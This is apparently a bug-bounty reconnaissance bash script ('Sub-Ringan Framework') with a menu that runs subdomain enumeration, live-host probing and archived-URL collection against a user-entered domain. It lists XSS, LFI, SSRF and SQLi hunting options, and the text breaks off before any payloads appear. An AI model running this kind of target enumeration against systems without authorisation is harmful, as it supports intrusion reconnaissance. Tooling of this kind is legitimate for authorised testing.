#!/bin/bash

Target() 
{
# Set target domain
echo  "\033[0;31m[*]\033[0;32m Enter the Domain NAME: "
read target_domain
echo "\033[0;31m-------------------------------------------------\033[0;33m "
mkdir $target_domain
cd $target_domain
pwd
echo "\033[0;31m-------------------------------------------------\033[0;33m "
ls
}

echo "\e[5;1;31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣴⣶⣶⣶⣶⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⠏⠁⠀⢶⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⡿⠿⣿⠀⠀⠀⠀⣿⠿⢿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⠀⢠⣾⣿⣿⣿⣿⣿⡿⠋⣠⣴⣿⣷⣤⣤⣾⣿⣦⣄⠙⢿⣿⣿⣿⣿⣿⣷⡄⠀
⠀⣼⣿⣿⣿⣿⣿⡏⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢹⣿⣿⣿⣿⣿⣧⠀
⢰⣿⣿⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⠟⠉⠉⠻⣿⣿⣿⣿⣷⠀⢿⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣇⣰⣿⣿⣿⣿⡇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣆⣸⣿⣿⣿⣿⣿⡇
⠸⣿⣿⣿⡿⣿⠟⠋⠙⠻⣿⣿⣿⣦⣀⣀⣴⣿⣿⣿⣿⠛⠙⠻⣿⣿⣿⣿⣿⠇
⠀⢻⣿⣿⣧⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠈⣿⣿⣿⡟⠀
⠀⠘⢿⣿⣿⣷⣦⣤⣴⣾⠛⠻⢿⣿⣿⣿⣿⡿⠟⠋⣿⣦⣤⠀⣰⣿⣿⡿⠃⠀
⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣈⣁⣠⣤⣶⣾⣿⣿⣷⣾⣿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⠿⠿⠿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "\e[0m\033[1;33m       >--->> Sub-Ringan Framework V0.15 <<---<  "
echo "\033[1;35m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣼⠀⠀⠀⠀⠈⠙⡆⢤⠀⠀⠀⠀⠀⣷⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⡷⡆⠀⣵⣶⣿⣾⣷⣸⣄⠀⠀⠀⢰⠾⡿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣽⣿⣿⣿⣿⡟⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣻⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠐⣻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡄⠀⠀⠀⠀⢻⣿⣿⣷⡌⠸⣿⣾⢿⡧⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⢛⣵⣾⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⣌⠙⠋⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣷⣮⡙⢿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⡀⠀⠀⠀⣠⣽⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣇⠀⠀⠀⠀
⠀⠀⠀⣴⣯⣴⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⡦⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⢴⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣧⣽⣦⠀⠀⠀
⠀⠀⣼⣿⣿⣿⠟⢁⣴⣿⡿⢿⣿⣿⡿⠛⣰⣿⠟⣻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⡿⢿⣿⣦⡈⠻⣿⣿⣿⣧⠀⠀
⠀⡼⣻⣿⡟⢁⣴⡿⠋⠁⢀⣼⣿⠟⠁⣰⣿⠁⢰⣿⣿⣿⡿⣿⣿⣿⠿⠀⣠⣤⣾⣿⣿⣿⣿⣿⠀⠀⠽⣿⣿⣿⢿⣿⣿⣿⡆⠈⢿⣆⠀⠻⣿⣧⡀⠈⠙⢿⣦⡈⠻⣿⣟⢧⠀
⠀⣱⣿⠋⢠⡾⠋⠀⢀⣠⡾⠟⠁⠀⢀⣿⠟⠀⢸⣿⠙⣿⠀⠈⢿⠏⠀⣾⣿⠛⣻⣿⣿⣿⣿⣯⣤⠀⠀⠹⡿⠁⠀⣿⠏⣿⡇⠀⠹⣿⡄⠀⠈⠻⢷⣄⡀⠀⠙⢷⣄⠙⣿⣎⠂
⢠⣿⠏⠀⣏⢀⣠⠴⠛⠉⠀⠀⠀⠀⠈⠁⠀⠀⠀⠛⠀⠈⠀⠀⠀⠀⠈⢿⣿⣼⣿⣿⣿⣿⢿⣿⣿⣶⠀⠀⠀⠀⠀⠁⠀⠛⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠛⠦⣄⣀⣹⠀⠹⣿⡄
⣼⡟⠀⣼⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠁⠀⢹⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣧⠀⢻⣷
⣿⠃⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣶⣦⣤⠀⠀⣿⡿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⠘⣿
⣿⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠈⢻⣷⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣀⣀⣸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣿
⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇
⠈⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo "\033[2;33mAuthor of this Framework:\e[5;31m DEV VIJAY\e[0m 🇮🇳"
echo "Github : \033[1;35m(https://github.com/DevVj-1 ) "
echo "Linkedin : \033[1;32m(https://www.linkedin.com/in/dev-vj1/ )"
echo "Instagram :\033[1;34m(https://www.instagram.com/dev_vj1/ )"
echo "\033[1;31m-------------------------------------------------\033[0;33m "
echo "\033[1;33m{~} Let's Start digging into Target website 🔍 --> 🍭" 
echo "\033[0;31m-------------------------------------------------\033[0;33m "
echo "\033[0;33m          Welcome to BugHunter's Heaven!"
echo "Sub-Ringan Tool be like!, What you want from me 🤣 "
echo "\033[0;31m-------------------------------------------------\033[0;33m "
echo "[~] Choose any one option"
echo "\033[1;31m[+] Subdomain Hunting        [1]"
echo "\033[1;35m[+] URL Hunting              [2]"
echo "\033[1;32m[+] XSS Hunting              [3]"
echo "\033[1;34m[+] LFI Hunting              [4]"
echo "\033[1;33m[+] Ssrf Hunting             [5]"
echo "\033[1;31m[+] SQLi Hunting             [6]\033[1;33m"
echo "\033[1;31m-------------------------------------------------\033[1;33m "

read -p "[*] Enter your choice (1-6): " choice 
case $choice in
1)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "\033[0;33mSubdomain Hunting \e[5;1;95m"
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⠀⣴⠏⢠⢀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠉⢷⡈⢣⡀⠀⢸⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⢃⡼⠃⠀⣸⠸⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⢸⠀⠀⠙⣦⡿⣦⡀⢇⠀⠀⠀
⠀⠀⢠⠀⠀⠀⠀⢸⡿⠁⠀⠀⡷⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣀⣈⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⢸⣷⠀⠀⠈⠻⣿⣷⣼⣦⡀⠀
⠂⠀⡜⠷⣄⣀⠀⠈⠁⠀⠀⢀⡇⣧⣠⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⢸⠃⠀⢀⡈⣿⣆⠀⠀⠀⠈⢻⣯⡷⠳⢤
⠀⠀⢹⡀⡇⠈⠏⠓⠒⠤⣄⣸⠇⡏⠉⠙⠛⠶⢤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠞⠁⢀⣀⣤⡿⠖⠛⠉⠀⣸⠙⢦⠤⠴⢶⠋⢹⠀⡄⠀
⠀⠀⠀⣷⡇⢰⠀⠀⠀⠀⠀⠈⠀⠙⠿⣶⣶⡤⢤⣄⣈⣻⣿⡛⠓⠲⠶⠤⢤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⠤⠤⠴⢿⣯⡴⣛⣉⣉⣤⣤⠤⠶⠒⠛⠉⠀⠀⠀⠀⠹⠀⣸⡜⠀⠀
⠀⠀⢠⠞⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠳⢴⣦⣄⣉⠀⠉⠉⠛⠓⠒⠲⣶⠶⠦⠤⠴⠤⠶⣤⠶⠶⠒⠒⠚⠋⢉⣩⣿⢉⡿⠥⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⡟⠀⠀⠀
⠇⣰⠋⠀⣿⢸⠀⠀⠀⠀⠀⠀⢀⣀⠤⠴⠒⠒⠀⠈⠙⠺⢽⣒⠤⣄⣀⠀⠀⠸⡀⠀⠀⠀⠀⢰⠃⠀⠀⣀⣠⣶⡺⠟⠋⠀⡿⡇⠀⠀⠈⠙⠲⣄⡀⠀⠀⠀⠀⡇⢸⠀⠀⠀⠀
⡇⡇⠀⢸⠹⣾⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡓⠢⠭⣿⠞⠁⠀⠀⠀⠀⠿⠒⣮⠿⠟⣋⡥⠴⠶⣶⣾⣿⣿⣿⠋⠉⠉⠉⣿⠟⠀⠀⠀⠀⣧⣶⡀⠰⡀⠀
⣧⢱⡀⠘⣄⣿⠀⠀⠀⠀⠀⠀⠻⠶⠦⣤⣀⣀⣀⣀⣀⣀⣠⠄⣴⣿⣠⡀⠳⡄⠀⠀⠀⠀⠀⢠⡴⠁⠀⢿⣅⡀⠀⠀⠙⠿⠿⠿⠋⢀⣀⡤⠚⠁⠀⠀⠀⠀⠀⣿⢁⡗⢀⡇⢰
⣿⣧⠹⣄⢘⡿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⠶⠞⣻⣟⡉⠤⠾⠁⠀⠀⠀⠀⠀⡟⠑⠲⢷⣾⣿⣿⣯⣍⣉⣻⣙⡏⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣯⠞⠀⡜⢀⣾
⣿⣽⣧⡈⠻⠁⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠐⠀⠀⠀⢠⡇⠀⠀⠀⠀⠉⠑⠉⠉⠉⢹⢙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢿⣀⡞⠀⣾⣿
⠋⣀⣼⣷⡀⠀⢧⠀⠀⢐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠉⢀⣾⠿⢿
⣾⠟⠋⠀⣷⠶⢺⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⢀⣾⠻⣷⣤
⡏⠀⠀⢀⡇⢰⠀⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⢧⣤⡞⠁⠀⠙⢯
⡇⠀⠀⣾⠇⣿⠀⢸⣿⣿⣦⣄⡀⠀⠀⠀⠀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣾⣽⡀⠀⠀⠀⠀⠀⢀⣀⣴⣿⡿⠀⣿⡀⠀⠀⠀⠀
⡇⣀⣰⡿⢠⣿⡆⠀⢿⣿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⠇⠀⢿⣷⣄⡀⠀⠀
⣿⣿⣿⣧⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⣿⢸⣿⣿⡿⣿⠿"
echo "\e[0m\033[0;31m-------------------------------------------------\033[0;33m "

Target
echo "\033[0;31m-------------------------------------------------\033[1;33m "


# Define output file for  subdomains
echo  "\033[0;31m[*] \033[0;32m Enter the Output File name [\033[0;31m Example:subdomain.txt\033[0;32m]: "
read output_file 

# Use Subfinder to find subdomains  and append to output file 
echo "\033[0;32m[*]\033[0;32m  subfinder Processing..."
subfinder -d $target_domain -v | tee -a $output_file 

# Use Assetfinder to find subdomains and append to output file
echo "\033[1;35m[*]\033[0;32m  Assetfinder Processing..."
assetfinder --subs-only $target_domain -v | tee -a $output_file 

# Use Amass to find Subdomains and save to output file
echo "\033[1;32m[+]\033[0;32m NOTE: \033[0;35m Amass \033[0;32m take's some time to find domains! ໒(⊙ᴗ⊙)७✎▤  "
echo "\033[1;32m[*]\033[0;35m Amass Processing..."
amass enum -passive -d $target_domain --silent | tee -a  $output_file
cat $output_file >> subdomain_takeover_targets.txt 

echo "\033[0;32m[+]\033[0;31m Finding \033[0;32mlive-Subdomains\033[0;31m and save it to a file! " 
cat $output_file | httpx -silent -t 100     | anew  $output_file
cat $output_file | sed -i 's/http:\/\///g'  | anew  $output_file
cat $output_file | sed -i 's/https:\/\///g'     | anew $output_file
# Extract unique subdomains  and save to final output file
echo "\033[0;36m[\033[1;32m+\033[0;36m] \033[1;33m[$]  (づ ￣ ³￣)づ Thanks for your Patience!! "
;;

2)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "URL Hunting..."
echo "\e[5;1;91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⢐⣒⣉⣉⣉⣉⣒⡲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢊⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⡳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠤⠤⠤⠞⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡜⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢖⣩⣴⣶⣾⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣈⣀⣒⡒⠢⢄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⣡⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣍⠢⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢰⣿⣿⣿⣿⣿⣿⣿⣇⠘⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡜⢆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣈⠛⠿⣿⣿⣿⡿⠋⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠾⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣬⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⠀
⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢚⣡⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⡆
⠈⣟⠲⢄⡀⠀⠀⣀⠴⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣻⣶⣬⣽⣿⣿⣿⣿⣿⣿⣿⣿⠀⡇
⠀⠸⡄⣷⣬⣍⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢸⠁
⠀⠀⢳⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡎⠀
⠀⠀⠀⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣥⣶⣿⣿⣿⣶⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⡞⠀⠀
⠀⠀⠀⠀⠳⡙⢿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡙⢿⣿⣿⣿⣿⣿⣿⠿⢋⡵⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠢⣙⠿⢿⣿⣿⣿⣿⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡮⣭⣉⡭⠭⠔⠚⠁⠀⡀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠲⠭⠭⠕⢣⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣱⠁⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠂⠀⠳⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢧⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⠔⠁⠀⠀⠸⠀⠀⠘⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⣝⣛⠛⠛⠛⣛⣋⠥⠚⠁⠀⠉⠒⠬⢭⣛⣛⣛⣫⠭⠔⠊⠁⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⠀⠉⢉⠉⢁⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⢰⠀⠀⢀⠀⠀⡆⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠀⠀⠈⠀⠈⠀⠀⠠⠆⠀⠆⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"

Target
echo "\033[1;33m[?]\033[1;33m Note:\033[1;35m Please note that,finding the URLs may take some time,\n          so please refrain from canceling the running script.\n\033[1;32m[$] Your patience is appreciated.\n "
echo "\033[1;35m "
  
read -p "Enter domains.txt file: " find_url
echo "Note:\033[2;33m Please Wait, Now Script running in --Silent mode \n      all data found in url.txt file"
echo ""
echo "\e[5;92m Finding...\e[0m"
cat $find_url | waybackurls | tee -a url1.txt 
echo "\e[5;92m Finding...urls using Second method!\e[0m"
cat $find_url | getallurls  | tee -a url2.txt
cat  url1.txt  url2.txt | anew  all_url.txt
cat all_url.txt | httpx -silent -t 100 | tee -a live_url.txt
rm  url1.txt url2.txt 
echo "\e[5;92m Finding Done!\e[0m"
;;

3)

echo "Testing for XSS vulnerability...\e[5;1;97m "
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⣷⣦⣄⣀⣤⣶⣶
⠀⠀⠀⠀⠀⣰⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⠟⠋
⠀⠀⠀⠀⣼⣿⡿⠃⠀⢀⣤⣾⣿⣿⣿⣿⣷⣦⣄⠀⠀⠈⠉⠀⠀⠀
⠀⠀⠀⣸⣿⡿⠁⠀⢠⣿⣿⠟⠉⠀⠈⠉⠛⢿⣿⣷⡄⠀⠀⠀⠀⠀
⠀⠀⢀⣿⣿⡇⠀⠀⣾⣿⡟⠀⠀⢀⣤⣄⠀⠀⠹⣿⣿⡄⠀⠀⠀⠀
